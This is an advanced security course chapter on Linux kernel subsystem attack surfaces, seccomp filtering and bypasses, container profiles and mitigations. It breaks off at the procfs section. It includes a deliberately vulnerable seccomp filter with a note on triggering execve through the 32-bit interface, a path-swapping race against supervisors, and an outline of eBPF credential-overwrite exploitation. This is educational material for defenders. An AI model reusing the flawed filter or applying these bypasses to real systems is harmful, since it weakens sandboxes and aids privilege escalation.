---
corso: "Cybersecurity Masterclass"
fase: "Domain 5 — Kernel Security and Exploitation"
modulo: "5.B"
titolo: "Subsystem Attack Surfaces, Seccomp, and Constrained Exploitation"
versione: "Linux 6.9+, libseccomp 2.5+, Docker 25+, Kubernetes 1.30+, Falco 0.38+, Tetragon 1.1+, syzkaller latest"
livello: "Advanced"
prerequisiti:
  - "Chapter 5A — SLUB allocator, UAF categories, kernel ROP, SMEP/SMAP/KPTI"
  - "Domain 2, Chapter 2B — seccomp, io_uring, ptrace"
  - "Domain 2, Chapter 2C — capabilities, namespaces, LSMs"
  - "BPF instruction set basics (cBPF for seccomp filters)"
  - "Container runtime architecture (Docker, OCI, cgroup v1/v2)"
obiettivi:
  - "Write seccomp-BPF filters in raw cBPF and libseccomp that correctly validate architecture and block dangerous syscalls including argument-level filtering"
  - "Identify and exploit seccomp bypass vectors (architecture confusion, io_uring bypass, TOCTOU on user-notification, allowed-syscall abuse)"
  - "Map kernel subsystem attack surfaces (struct file, TTY, eBPF verifier, nf_tables, io_uring, FUSE, cgroup) to specific vulnerability classes and detection telemetry"
  - "Construct detection engineering pipelines (Sigma, YARA, Falco, Tetragon) covering each subsystem attack surface"
  - "Evaluate Android-specific kernel exploitation surfaces (Binder, ION/dma-buf, GPU drivers, TrustZone, Knox/KAP) and their defense architectures"
tag: [security, kernel, seccomp, ebpf, io-uring, nf-tables, container-escape, cgroup, lsm, selinux, apparmor, landlock, android, binder, detection, falco, tetragon]
---

# Domain 5, Chapter 5B — Subsystem Attack Surfaces, Seccomp, and Constrained Exploitation

> **Learning Objectives**
>
> After completing this chapter, you will be able to:
>
> 1. Implement seccomp-BPF filters with architecture validation, argument-level filtering, and user-notification supervision.
> 2. Identify and demonstrate seccomp bypass vectors including architecture confusion, io_uring bypass, and TOCTOU against user-notification supervisors.
> 3. Map each kernel subsystem (file, TTY, eBPF, netfilter, io_uring, cgroup, drivers) to its vulnerability classes and available detection telemetry.
> 4. Build and deploy detection rules across Sigma, YARA, Falco, and Tetragon for kernel subsystem exploitation indicators.
> 5. Assess Android kernel attack surfaces (Binder, GPU, TrustZone) and evaluate Samsung Knox/KAP defense architecture.

> **Scope.** Seccomp internals (strict mode, filter mode, BPF filter programs, libseccomp, bypass techniques, container integration, audit). Kernel subsystem attack surfaces: `struct file` exploitation, Unix sockets, TTY, eBPF verifier, netfilter/nf_tables, io_uring, filesystem (VFS, procfs, overlayfs, FUSE), IPC (`msg_msg` heap spray, credential passing), drivers (char devices, fuzzing, USB), cgroups (escape via `release_agent`), LSM (SELinux, AppArmor, Landlock). Android-specific kernel exploitation (Binder, ION/dma-buf, GPU, TrustZone, Knox/KAP, SELinux policy). Exploitation under seccomp constraints.
>
> **Orientation.** Same as Chapter 5A: architectural descriptions of attack surfaces, prerequisite primitives, detection surfaces, and mitigations. The goal is that a detection engineer understands what telemetry each exploitation path produces, and a hardening engineer understands what configuration closes each path.
>
> **Prerequisites.** Chapter 5A (SLUB, UAF categories, kernel ROP, SMEP/SMAP/KPTI). Domain 2 Chapter 2B (seccomp, io_uring, ptrace). Domain 2 Chapter 2C (capabilities, namespaces, LSMs).

---

## 1. `struct file` Exploitation

### 1.1 The `file` → `file_operations` → function pointer chain

Every open file descriptor in the kernel is backed by a `struct file` (allocated from the `filp` slab cache). The critical field for exploitation is `f_op`, a pointer to a `const struct file_operations`:

```c
struct file_operations {
    struct module *owner;
    loff_t (*llseek)(struct file *, loff_t, int);
    ssize_t (*read)(struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write)(struct file *, const char __user *, size_t, loff_t *);
    int (*open)(struct inode *, struct file *);
    int (*release)(struct inode *, struct file *);
    long (*unlocked_ioctl)(struct file *, unsigned int, unsigned long);
    int (*mmap)(struct file *, struct vm_area_struct *);
    unsigned int (*poll)(struct file *, struct poll_table_struct *);
    /* ... ~30 function pointers total ... */
};
```

When userspace calls `read(fd, ...)`, the kernel resolves `fd` → `struct file` → `f_op->read` and calls the function pointer. If the attacker can overwrite `f_op` (pointing it at a fake `file_operations` table in controlled memory) or overwrite individual entries in the real table (if writable, which it normally isn't — `f_op` points to `const` data in `.rodata`), they redirect kernel execution.

### 1.2 The `dentry` and `inode` path

`struct file` also contains `f_path.dentry` (the directory entry) and `f_inode` (the inode). These structures contain their own vtables (`dentry_operations`, `inode_operations`, `super_operations`). Corrupting these provides alternative function-pointer hijack targets, though they are less frequently used than `f_op` because they require a different access pattern to trigger.

### 1.3 Stable objects for heap feng shui

Certain device files create kernel objects with predictable allocation behavior:

**`/dev/ptmx`**: opening a pseudo-terminal master allocates a `tty_struct` (typically from `kmalloc-1024`). Most-used spray object — large allocation size covers many target size classes, content is partially controllable (the `tty_operations` pointer), object persists until fd is closed.

**`/dev/null` and `/dev/zero`**: opening these allocates a `struct file` from the `filp` cache. `f_op` points to the well-known `null_fops` or `zero_fops` (read-only, `.rodata`). Useful as filler objects for predictable heap state.

**Pipes**: `pipe()` allocates `struct pipe_inode_info` and associated `struct pipe_buffer` arrays. Buffer count is controllable via `fcntl(F_SETPIPE_SZ)`, and the buffer array comes from `kmalloc-*` caches of various sizes.

**Detection:** a process opening large numbers of `/dev/ptmx`, `/dev/null`, or pipes without corresponding I/O is anomalous. Monitor `open` syscall patterns on these device paths.

---

## 2. Seccomp — Mechanism and Internals

### 2.1 Strict mode

Seccomp strict mode was the original implementation (Linux 2.6.12). Enabled via:

```c
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
```

Strict mode allows exactly four syscalls: `read`, `write`, `exit`, and `sigreturn` (`rt_sigreturn` on x86_64). Any other syscall triggers `SIGKILL`. No configuration, no exceptions. The process can only read/write on already-open file descriptors and exit.

Internally, the kernel sets `TIF_SECCOMP` on the thread and checks the syscall number in `__secure_computing()` on every syscall entry. In strict mode, the check is a hardcoded allowlist — no BPF evaluation overhead.

Use case: compute-only sandboxes that receive input on stdin and produce output on stdout. Google's NaCl originally used strict mode.

### 2.2 Filter mode (seccomp-BPF)

Filter mode (Linux 3.5) allows a BPF program to inspect each syscall and decide the action. Enabled via two interfaces:

```c
/* Method 1: prctl — requires PR_SET_NO_NEW_PRIVS first */
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);

/* Method 2: seccomp() syscall (Linux 3.17) — more flags available */
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
seccomp(SECCOMP_SET_MODE_FILTER, flags, &prog);
```

The `seccomp()` syscall supports flags that `prctl` does not:

| Flag | Effect |
|------|--------|
| `SECCOMP_FILTER_FLAG_TSYNC` | Apply filter to all threads |
| `SECCOMP_FILTER_FLAG_LOG` | Log all filtered actions |
| `SECCOMP_FILTER_FLAG_SPEC_ALLOW` | Disable speculative execution mitigations |
| `SECCOMP_FILTER_FLAG_NEW_LISTENER` | Return a notification fd for user-space supervisor |
| `SECCOMP_FILTER_FLAG_TSYNC_ESRCH` | Fail if thread sync can't apply |
| `SECCOMP_FILTER_FLAG_WAIT_KILLABLE_RECV` | Supervisor notification: interruptible wait |

`PR_SET_NO_NEW_PRIVS` is required unless the caller has `CAP_SYS_ADMIN`. This prevents a filter from being a privilege escalation tool (a setuid binary cannot gain privileges while seccomp-filtered).

### 2.3 BPF filter program structure

The BPF program is a `struct sock_fprog` containing an array of `struct sock_filter` instructions:

```c
struct sock_filter {
    __u16 code;   /* opcode */
    __u8  jt;     /* jump offset if true */
    __u8  jf;     /* jump offset if false */
    __u32 k;      /* immediate value */
};

struct sock_fprog {
    unsigned short len;     /* number of instructions */
    struct sock_filter *filter;
};
```

The BPF program operates on a `struct seccomp_data` input:

```c
struct seccomp_data {
    int   nr;                    /* syscall number */
    __u32 arch;                  /* AUDIT_ARCH_* value */
    __u64 instruction_pointer;
    __u64 args[6];               /* syscall arguments */
};
```

### 2.4 BPF instruction set for seccomp

Seccomp uses classic BPF (cBPF), not eBPF. The instruction set:

| Instruction class | Opcodes | Description |
|-------------------|---------|-------------|
| `BPF_LD` | `BPF_W`, `BPF_ABS` | Load word from `seccomp_data` at absolute offset |
| `BPF_LD` | `BPF_W`, `BPF_MEM` | Load from scratch memory |
| `BPF_ST` | | Store accumulator to scratch memory |
| `BPF_ALU` | `BPF_AND`, `BPF_OR`, `BPF_RSH` | Arithmetic/logic on accumulator |
| `BPF_JMP` | `BPF_JEQ`, `BPF_JGE`, `BPF_JGT`, `BPF_JSET` | Conditional jump (jt/jf offsets) |
| `BPF_JMP` | `BPF_JA` | Unconditional jump |
| `BPF_RET` | `BPF_K` | Return action value |

Return values encode the action in the high 16 bits and optional data in the low 16:

| Return action | Value | Behavior |
|---------------|-------|----------|
| `SECCOMP_RET_KILL_PROCESS` | `0x80000000` | Kill entire process |
| `SECCOMP_RET_KILL_THREAD` | `0x00000000` | Kill offending thread |
| `SECCOMP_RET_TRAP` | `0x00030000` | Send `SIGSYS` to thread |
| `SECCOMP_RET_ERRNO` | `0x00050000` | Return errno (low 16 bits) |
| `SECCOMP_RET_USER_NOTIF` | `0x7fc00000` | Forward to user-notification supervisor |
| `SECCOMP_RET_LOG` | `0x7ffc0000` | Allow but log |
| `SECCOMP_RET_ALLOW` | `0x7fff0000` | Allow silently |

### 2.5 Writing a raw BPF filter in C

A complete filter that validates architecture and blocks `execve`:

```c
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stddef.h>

#define ARCH_NR AUDIT_ARCH_X86_64

static void install_filter(void) {
    struct sock_filter filter[] = {
        /* [0] Load arch from seccomp_data */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, arch)),
        /* [1] Check arch == x86_64; if not, kill */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, ARCH_NR, 1, 0),
        /* [2] Wrong arch → kill process */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        /* [3] Load syscall number */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        /* [4] Check for execve (59 on x86_64) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
        /* [5] execve → kill */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        /* [6] Check for execveat (322 on x86_64) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 0, 1),
        /* [7] execveat → kill */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        /* [8] Allow everything else */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}
```

The architecture check at instruction [0]-[2] is critical — without it, the filter is vulnerable to architecture confusion (§2.8).

### 2.6 Argument filtering

BPF can inspect syscall arguments via `seccomp_data.args[0..5]`. Because arguments are 64-bit but BPF operates on 32-bit words, each argument requires two loads:

```c
/* Block mprotect with PROT_EXEC (arg2 & PROT_EXEC != 0) */

/* Load low 32 bits of arg2 (third argument, index 2) */
BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
         offsetof(struct seccomp_data, args[2])),
/* Test PROT_EXEC bit */
BPF_JUMP(BPF_JMP | BPF_JSET | BPF_K, PROT_EXEC, 0, 1),
/* PROT_EXEC set → block */
BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),
```

Critical limitation: arguments are captured at syscall entry. For pointer arguments (filenames, buffer addresses), the BPF filter sees the pointer value, not the pointed-to data. The filter cannot inspect strings or buffer contents.

### 2.7 libseccomp high-level API

`libseccomp` provides an abstraction over raw BPF filter construction:

```c
#include <seccomp.h>

int setup_sandbox(void) {
    /* Default action: allow all syscalls */
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
    if (!ctx) return -1;

    /* Block execve */
    seccomp_rule_add(ctx, SCMP_ACT_KILL_PROCESS, SCMP_SYS(execve), 0);

    /* Block execveat */
    seccomp_rule_add(ctx, SCMP_ACT_KILL_PROCESS, SCMP_SYS(execveat), 0);

    /* Block mprotect with PROT_EXEC */
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(mprotect), 1,
                     SCMP_A2(SCMP_CMP_MASKED_EQ, PROT_EXEC, PROT_EXEC));

    /* Block ptrace */
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(ptrace), 0);

    /* Load the filter into the kernel */
    int rc = seccomp_load(ctx);
    seccomp_release(ctx);
    return rc;
}
```

Default actions for `seccomp_init()`:

| Macro | Value | Effect on non-matching syscalls |
|-------|-------|---------------------------------|
| `SCMP_ACT_KILL` | `0x00000000` | Kill thread |
| `SCMP_ACT_KILL_PROCESS` | `0x80000000` | Kill process |
| `SCMP_ACT_TRAP` | `0x00030000` | Send SIGSYS |
| `SCMP_ACT_ERRNO(x)` | `0x00050000 | x` | Return -1 with errno=x |
| `SCMP_ACT_LOG` | `0x7ffc0000` | Allow and log |
| `SCMP_ACT_ALLOW` | `0x7fff0000` | Allow silently |

Architecture handling: `libseccomp` automatically inserts architecture validation. Call `seccomp_arch_add()` to support multiple architectures (e.g., x86 and x86_64 on a 64-bit system with 32-bit compat).

---

## 3. Seccomp Bypass Techniques

### 3.1 Architecture confusion

On x86_64 systems, both 64-bit and 32-bit (compat) syscalls are available. The syscall numbers differ between architectures. Example: `execve` is syscall 59 on x86_64 but syscall 11 on i386.

If the seccomp filter checks `nr == 59` without validating `arch`, an attacker can use `int 0x80` (the 32-bit syscall interface) to invoke syscall 11 (i386 `execve`), which the filter passes because it only checks for number 59.

```c
/* Vulnerable filter — missing arch check */
struct sock_filter bad_filter[] = {
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
             offsetof(struct seccomp_data, nr)),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1),  /* x86_64 execve */
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
};
/* Attacker triggers execve via: int 0x80 with eax=11 */
```

Mitigation: always check `seccomp_data.arch` first and kill on unexpected architecture. The `libseccomp` library handles this automatically.

Kernel-side mitigation: `CONFIG_X86_X32_ABI=n` and blocking `int 0x80` via `CONFIG_IA32_EMULATION=n` (available since Linux 6.7 as a runtime toggle via `ia32_emulation` sysctl) eliminates the 32-bit syscall path entirely.

### 3.2 TOCTOU on syscall arguments

Seccomp captures `seccomp_data.args[]` at syscall entry — these are the register values. For syscalls with pointer arguments (e.g., `openat(fd, pathname, ...)`), the filter sees the pointer, not the string. Even if a supervisor (via `SECCOMP_RET_USER_NOTIF`) reads the pointed-to memory via `/proc/PID/mem`, the supervised thread can race:

1. Thread A: calls `openat(AT_FDCWD, "/safe/path", ...)`
2. Supervisor reads `/proc/PID/mem` at the pathname pointer → sees `/safe/path` → approves
3. Thread B (same process): changes the memory at the pointer to `/etc/shadow`
4. Kernel completes the `openat` with the modified path

This TOCTOU is inherent to seccomp user-notification. Mitigations:

- `SECCOMP_IOCTL_NOTIF_ID_VALID`: recheck that the notification is still pending after reading memory
- Use `SECCOMP_ADDFD_FLAG_SETFD` to inject fds directly into the supervised process rather than having it open files
- Copy arguments to supervisor-owned memory before inspection (the supervised process cannot modify the supervisor's memory)

The kernel documentation (`samples/seccomp/user-trap.c`) demonstrates the race-safe pattern.

### 3.3 Allowed syscall abuse

If certain powerful syscalls pass the filter, they become exploitation vectors:

**`prctl`**: if allowed, `prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT)` overwrites the filter with strict mode (may not help the attacker), but more importantly, `prctl(PR_SET_MM, ...)` can modify process memory layout, and `prctl(PR_SET_NAME, ...)` can modify the comm field (used for monitoring evasion).

**`clone`/`clone3`**: if allowed, the attacker can spawn new threads or processes. New threads inherit the seccomp filter, but the attacker gains concurrency (useful for TOCTOU races).

**`execve`/`execveat`**: if mistakenly allowed, the attacker escapes the sandbox entirely by executing an unrestricted binary.

**`ioctl`**: extremely versatile. `ioctl` on a TTY fd can perform terminal control; on a device fd it can trigger arbitrary driver code paths. Many container escapes chain through allowed `ioctl` operations.

**`process_vm_readv`/`process_vm_writev`**: if allowed, the sandboxed process can read/write another process's memory directly.

### 3.4 io_uring seccomp bypass

`io_uring` submits I/O operations via shared memory rings, not individual syscalls. On kernels before 5.12, syscalls dispatched through `io_uring` (e.g., `openat`, `read`, `write`, `connect`) did not pass through seccomp filters at all. The attacker could call `io_uring_setup` + `io_uring_enter` (if those two syscalls pass the filter) and then submit any operation through the ring, completely bypassing seccomp.

Linux 5.12 (commit `9e0e4a0a778e`) added `IORING_OP_*` checks, but individual operations still do not trigger seccomp — the check is at `io_uring_enter` only. The architectural bypass remains: seccomp operates at the syscall boundary, and io_uring moves operations below that boundary.

Hardening: block `io_uring_setup` (syscall 425 on x86_64) and `io_uring_enter` (426) and `io_uring_register` (427) in the seccomp filter. Alternatively, `sysctl io_uring_disabled=2` (Linux 6.1+) disables io_uring system-wide.

### 3.5 Kernel vulnerability exploitation from allowed syscalls

Even with a tight filter, the allowed syscalls represent kernel code paths. If a vulnerability exists in the code reached by an allowed syscall (e.g., a UAF in `recvmsg` handling, a buffer overflow in `ioctl` processing), the attacker can exploit it to gain kernel code execution. Kernel code execution is unrestricted by seccomp (seccomp operates at the syscall boundary, not within kernel execution).

This is the fundamental limitation: seccomp constrains the syscall interface, not the kernel itself. A kernel exploit through an allowed syscall path gives the attacker full kernel control.

---

## 4. Seccomp in Containers

### 4.1 Docker default profile

Docker applies a default seccomp profile that blocks ~44 syscalls out of ~330+. Key blocked syscalls:

| Blocked syscall | Rationale |
|-----------------|-----------|
| `kexec_load` | Load a new kernel |
| `reboot` | Reboot the host |
| `mount` | Mount filesystems |
| `umount2` | Unmount filesystems |
| `pivot_root` | Change root filesystem |
| `swapon`/`swapoff` | Swap management |
| `add_key`/`keyctl`/`request_key` | Kernel keyring |
| `bpf` | Load BPF programs |
| `clock_settime` | Modify system clock |
| `create_module`/`init_module`/`finit_module`/`delete_module` | Kernel modules |
| `get_kernel_syms`/`query_module` | Kernel symbol table |
| `perf_event_open` | Performance monitoring |
| `ptrace` | Process tracing |
| `unshare` (with `CLONE_NEWUSER`) | User namespace creation |

Inspect the active profile:

```bash
docker run --rm --security-opt seccomp=unconfined alpine  # disable
docker run --rm alpine  # default profile active
docker inspect --format '{{.HostConfig.SecurityOpt}}' CONTAINER
```

Custom profiles are JSON files following the OCI runtime spec:

```json
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "defaultErrnoRet": 1,
    "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
    "syscalls": [
        {
            "names": ["read", "write", "close", "fstat", "mmap", "exit_group"],
            "action": "SCMP_ACT_ALLOW"
        },
        {
            "names": ["openat"],
            "action": "SCMP_ACT_ALLOW",
            "args": [
                { "index": 2, "value": 2, "op": "SCMP_CMP_MASKED_EQ", "valueTwo": 2 }
            ]
        }
    ]
}
```

### 4.2 Kubernetes seccomp

Kubernetes supports seccomp via the `securityContext` in pod specs:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-pod
spec:
  securityContext:
    seccompProfile:
      type: RuntimeDefault   # container runtime's default profile
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      seccompProfile:
        type: Localhost
        localhostProfile: profiles/strict.json  # custom profile
```

Profile types: `RuntimeDefault` (the container runtime's default), `Localhost` (custom profile on the node at `/var/lib/kubelet/seccomp/`), `Unconfined` (no filter).

Since Kubernetes 1.27, `RuntimeDefault` can be applied cluster-wide via the `SeccompDefault` feature gate and `--seccomp-default` kubelet flag.

### 4.3 Seccomp audit and profiling

`SECCOMP_RET_LOG` allows the syscall but generates a kernel audit log entry:

```
type=SECCOMP msg=audit(1699012345.678:99): auid=1000 uid=1000 gid=1000 ses=1
subj=unconfined pid=12345 comm="target" exe="/usr/bin/target" sig=0
arch=c000003e syscall=59 compat=0 ip=0x7f123456789a code=0x7ffc0000
```

Fields: `arch` (audit architecture), `syscall` (number), `compat` (1 if 32-bit compat mode), `code` (the seccomp return action).

Profiling a workload to build a minimal allowlist:

```bash
# Method 1: strace to list all syscalls used
strace -f -c -S calls ./target_program 2>&1 | tail -20

# Method 2: SECCOMP_RET_LOG with default-kill
# Set up a profile that logs everything, run the workload, collect audit logs
ausearch -m SECCOMP --start recent

# Method 3: oci-seccomp-bpf-hook (generates OCI profiles from running containers)
# Intercepts syscalls via eBPF and writes a JSON profile
```

Hardening: production containers should use `SECCOMP_RET_KILL_PROCESS` (not `SECCOMP_RET_KILL_THREAD`) as the default action. Thread-level kill leaves the process in an inconsistent state and may allow the remaining threads to continue exploitation.

---

## 5. The Unix Socket Subsystem

### 5.1 Attack surface

Unix domain sockets (`AF_UNIX`) provide in-kernel IPC. The `sendmsg`/`recvmsg` path involves several kernel allocations:

`unix_dgram_sendmsg` and `unix_stream_sendmsg` allocate `sk_buff` structures for the message data. The `sk_buff` data area comes from `kmalloc-*` caches, with size controllable by the sender (the message length). This makes Unix socket `sendmsg` a flexible spray primitive.

`SCM_RIGHTS` (file descriptor passing) allocates `struct scm_fp_list` to hold the file descriptors being passed. The kernel creates `struct file` references for each fd, involving allocations in the `filp` cache.

The garbage collector for Unix sockets (`unix_gc`) has historically been a source of race-condition bugs: it walks the in-flight fd graph looking for cycles, and races between gc and normal socket operations have caused UAF and use-after-close bugs.

### 5.2 Credential and fd passing

Unix sockets support ancillary data via `SCM_CREDENTIALS` (passing process credentials: pid, uid, gid) and `SCM_RIGHTS` (passing file descriptors). `SCM_RIGHTS` is a powerful mechanism: any open fd can be passed to another process, including fds to devices, sockets, or files the receiver could not open itself.

Exploitation: a process with access to a privileged fd (e.g., an open `/dev/sda` or a connected socket to a privileged service) can pass that fd to an attacker process. In container scenarios, a compromised privileged container can pass host fds to an unprivileged container.

Abstract namespace sockets (`\0` prefix) are Linux-specific and do not appear in the filesystem. They are accessible to any process in the same network namespace, which in container environments means any container sharing a network namespace can connect to abstract sockets of other containers in that namespace.

### 5.3 Network namespace escapes

Network namespaces (Domain 2, Chapter 2C §3.3) isolate network stacks. Escape vectors: kernel vulnerabilities in `netns` lifecycle (races during namespace creation/destruction), VETH-pair misconfigurations (container's veth endpoint leaking host connectivity), netfilter bugs where rules or connections from one namespace leak into another's state.

Detection: unexpected network traffic originating from a container's PID that targets host interfaces. Container runtime network monitoring (Cilium, Calico) flags traffic impossible under network policy.

---

## 6. TTY Subsystem Exploitation

### 6.1 The `tty_struct` hierarchy

**`struct tty_struct`** (~640 bytes, typically `kmalloc-1024`). Contains `ops` (pointer to `struct tty_operations`), `ldisc` (current line discipline), `driver_data` (driver-specific state). The `tty_operations` vtable has ~25 function pointers: `open`, `close`, `write`, `ioctl`, `put_char`, `chars_in_buffer`, `set_termios`, etc.

**`struct tty_ldisc_ops`** (line discipline vtable). Line disciplines process data between driver and userspace. Default is `n_tty`. Others: `n_hdlc`, `n_ppp`, `n_slip`. Each has `open`, `close`, `read`, `write`, `ioctl`, `receive_buf`.

### 6.2 Why TTY is a persistent target

`tty_struct` is allocated from a generic `kmalloc-*` cache (not dedicated), directly reachable from any generic spray. Opening `/dev/ptmx` is unprivileged and creates a `tty_struct` reliably. The vtables provide many triggerable function pointers via `ioctl`, `read`, `write`, `tcsetattr`. An attacker who controls a `tty_struct`'s `ops` pointer can redirect any of these operations.

### 6.3 Detection

TTY exploitation pattern: opening many `/dev/ptmx` descriptors (spray), closing some selectively (grooming), then performing ioctl operations on a dangling reference. Monitor for processes that open many ptmx descriptors without corresponding `ptsname`/`grantpt`/`unlockpt` calls. Audit rules on `openat` with `/dev/ptmx` path filtering provide the raw data.

---

## 7. eBPF Verifier and Security

### 7.1 The verifier's role

The eBPF verifier (`kernel/bpf/verifier.c`) statically analyzes every BPF program before loading: no out-of-bounds access, no infinite loops, no uninitialized reads, no unauthorized kernel memory access. A verifier bug that accepts an unsafe program gives the attacker arbitrary kernel read/write.

### 7.2 Verifier bug categories

**Type confusion.** The verifier tracks register types (pointer-to-map-value, pointer-to-ctx, scalar). A bug that misclassifies a register — treating a scalar as a bounded pointer — allows out-of-bounds memory access. CVE-2021-3490 was a type confusion in the ALU32 bounds tracking where a bitwise operation on a register caused the verifier to lose track of bounds, allowing arbitrary kernel read/write.

**Bounds tracking errors.** The verifier tracks min/max ranges for each register. Incorrect handling of arithmetic, sign-extension, or conditional branches causes the verifier to accept out-of-bounds accesses. CVE-2022-23222 was a bounds tracking error where the verifier incorrectly computed pointer bounds after a specific sequence of ALU operations, allowing the BPF program to access arbitrary kernel memory.

**Speculative execution leaks.** The verifier must account for speculative execution past bounds checks. The kernel inserts speculation barriers (`lfence` on x86) after bounds checks, but bugs in this mitigation have allowed speculative cache-based leaks.

**ALU sanitation bypasses.** The kernel sanitizes pointer arithmetic by masking results. Bugs in mask computation for certain ALU operations defeat this safety net.

### 7.3 eBPF exploitation technique

A typical eBPF verifier exploit:

1. Craft a BPF program that passes the verifier despite having an out-of-bounds access
2. The program reads `current_task` (the `task_struct` of the running process)
3. Walk from `task_struct` → `cred` → `uid`/`gid`/`cap_effective`
4. Write new credentials (uid=0, full capabilities)
5. The BPF program returns; the calling process is now root

```c
/* Conceptual — exact technique varies per CVE */
/* Step: read task_struct pointer via helper or kfunc */
/* Step: use verifier-confused register to read/write at arbitrary offset */
/* Step: overwrite cred fields */
```

### 7.4 eBPF for defense

eBPF is also a major defensive tool:

- **Cilium**: eBPF-based network policy enforcement for Kubernetes
- **Falco**: runtime security monitoring via eBPF syscall tracing
- **bpftrace**: one-liner kernel tracing for incident response
- **Tracee** (Aqua Security): eBPF-based runtime detection

### 7.5 Mitigations

`kernel.unprivileged_bpf_disabled = 1` (default on many distributions since Linux 5.16+): prevents non-root BPF loading. This is the single most effective mitigation. `CAP_BPF` (or `CAP_SYS_ADMIN`) is required.

```bash
sysctl -w kernel.unprivileged_bpf_disabled=1  # runtime
echo 'kernel.unprivileged_bpf_disabled=1' >> /etc/sysctl.d/99-ebpf.conf  # persistent
```

---

## 8. Netfilter and nf_tables Exploitation

### 8.1 Netfilter hook points

Netfilter processes packets at five hook points in the network stack:

| Hook | Location | Typical use |
|------|----------|-------------|
| `NF_INET_PRE_ROUTING` | Before routing decision | DNAT, conntrack |
| `NF_INET_LOCAL_IN` | Destined for local process | Input filtering |
| `NF_INET_FORWARD` | Being routed through | Forward filtering |
| `NF_INET_LOCAL_OUT` | Generated by local process | Output filtering |
| `NF_INET_POST_ROUTING` | After routing decision | SNAT, masquerade |

`nf_tables` replaced `iptables`' in-kernel representation with a bytecode expression engine. Rules, sets, chains, and tables are kernel objects managed through netlink. The interaction between rule evaluation (data path) and rule management (control path) creates opportunities for race conditions and UAF.

### 8.2 Recurring vulnerability patterns

`nf_tables` has produced a consistent stream of local privilege escalation CVEs:

- **CVE-2022-32250**: UAF in `nft_set_elem_init` — set element freed while still referenced
- **CVE-2023-32233**: UAF in anonymous set handling during rule deletion — batch request race
- **CVE-2024-1086**: double-free in `nf_tables` verdict handling — `nft_verdict_init` reference counting error in `NF_DROP` with `NF_QUEUE`

These vulnerabilities are reachable from within a user namespace (`CAP_NET_ADMIN` in a user namespace allows nf_tables operations), making them relevant in containers without host-level `CAP_NET_ADMIN`.

### 8.3 Mitigation

```bash
# Restrict user-namespace creation
sysctl -w kernel.unprivileged_userns_clone=0
# Or hard limit
echo 0 > /proc/sys/user/max_user_namespaces
# Within containers: drop CAP_NET_ADMIN from capability set
```

---

## 9. `io_uring` Exploitation

### 9.1 Key structures

**`struct io_ring_ctx`**: per-ring context holding submission/completion queues, registered buffers/files, SQ polling thread reference, accounting.

**`struct io_kiocb`**: one per in-flight request. Contains operation type, target file, buffer references, completion state, linked-list pointers for chaining.

The SQ and CQ are memory-mapped into userspace. SQEs (submission queue entries) written by userspace; CQEs (completion queue entries) written by kernel.

### 9.2 Vulnerability patterns

**Reference counting**: `io_kiocb` lifecycle is complex (linked, cancelled, timed out, polled, completed asynchronously). Missing `get` or extra `put` → UAF.

**Fixed buffer handling**: `IORING_REGISTER_BUFFERS` pins pages with kernel tracking. Interactions between registration, provision, and completion create UAF/double-free.

**File reference handling**: `IORING_REGISTER_FILES` + `IORING_REGISTER_FILES_UPDATE` + in-flight operations create race windows.

**Credential handling**: `IORING_REGISTER_PERSONALITY` allows operations with different credentials. Bugs → privilege confusion.

### 9.3 Mitigation

```bash
# Disable io_uring for unprivileged users
sysctl -w io_uring_disabled=1
# Disable io_uring entirely
sysctl -w io_uring_disabled=2
# Seccomp: block io_uring_setup (425), io_uring_enter (426), io_uring_register (427)
```

---

## 10. Filesystem Subsystem

### 10.1 VFS layer

The Virtual File System (VFS) is the abstraction layer between userspace file operations and concrete filesystems. Key structures:

- **`struct super_block`**: per-mounted-filesystem metadata, contains `s_op` (superblock operations vtable)
- **`struct inode`**: per-file metadata, contains `i_op` (inode operations) and `i_fop` (default file operations)
- **`struct dentry`**: directory entry in the dentry cache, links names to inodes, contains `d_op` (dentry operations)
- **`struct file`**: per-open-file-descriptor, contains `f_op` (file operations)

The dentry cache (`dcache`) is a performance-critical hash table. Dentry lifecycle bugs (premature free while still in the cache) produce UAF conditions exploitable via controlled path lookups.

### 10.2 Procfs and sysfs

